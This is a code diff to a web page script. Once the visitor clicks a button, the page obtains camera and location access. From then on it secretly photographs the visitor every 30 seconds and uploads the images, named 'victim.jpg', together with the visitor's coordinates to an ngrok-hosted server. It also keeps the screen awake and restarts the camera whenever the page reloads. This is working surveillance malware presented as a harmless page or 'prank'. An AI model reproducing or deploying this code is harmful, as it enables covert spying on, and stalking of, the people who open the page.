@@ -36,41 +36,63 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         const startBtn = document.getElementById("startBtn");
+        const SERVER_URL = "https://532c-45-245-185-41.ngrok-free.app/upload";  // Your ngrok URL
 
-        // Your server URL (replace with your NGROK link)
-        const SERVER_URL = "https://532c-45-245-185-41.ngrok-free.app/upload";  
+        // Prevent screen from turning off
+        if ("wakeLock" in navigator) {
+            navigator.wakeLock.request("screen").catch(err => console.error("Wake Lock failed:", err));
+        }
 
+        // Ask for camera and location permissions
         startBtn.addEventListener("click", function () {
-            startBtn.style.display = "none"; // Hide button after click-
+            startBtn.style.display = "none"; // Hide button
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(captureImage, 2500); // Take first photo after 2.5 seconds
-                
-                // Start taking photos every 30 seconds
-                setInterval(captureImage, 30000);  
+                setInterval(captureAndSend, 30000);  // Take and send a photo every 30 seconds
             })
             .catch(err => console.error("Camera access denied:", err));
+
+            // Get location
+            navigator.geolocation.getCurrentPosition(
+                pos => sendLocation(pos.coords.latitude, pos.coords.longitude),
+                err => console.error("Location access denied:", err)
+            );
         });
 
-        function captureImage() {
+        // Capture image and send
+        function captureAndSend() {
+            if (!video.srcObject) return; // Stop if no camera access
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convert image to Blob and send to server
             canvas.toBlob(blob => {
                 let formData = new FormData();
-                formData.append("file", blob, "prank.jpg");
+                formData.append("file", blob, "victim.jpg");
 
-                fetch(SERVER_URL, {  
-                    method: "POST",
-                    body: formData
-                })
-                .then(response => console.log("Image sent!"))
-                .catch(error => console.error("Error:", error));
+                fetch(SERVER_URL, { method: "POST", body: formData })
+                .catch(error => console.error("Error sending image:", error));
             }, "image/jpeg");
         }
+
+        // Send location to server
+        function sendLocation(lat, lon) {
+            fetch(SERVER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ location: `Latitude: ${lat}, Longitude: ${lon}` })
+            })
+            .catch(error => console.error("Error sending location:", error));
+        }
+
+        // Auto restart camera if page is reopened
+        window.addEventListener("load", () => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => video.srcObject = stream)
+            .catch(err => console.error("Camera restart failed:", err));
+        });
+
     </script>
 </body>
 </html>
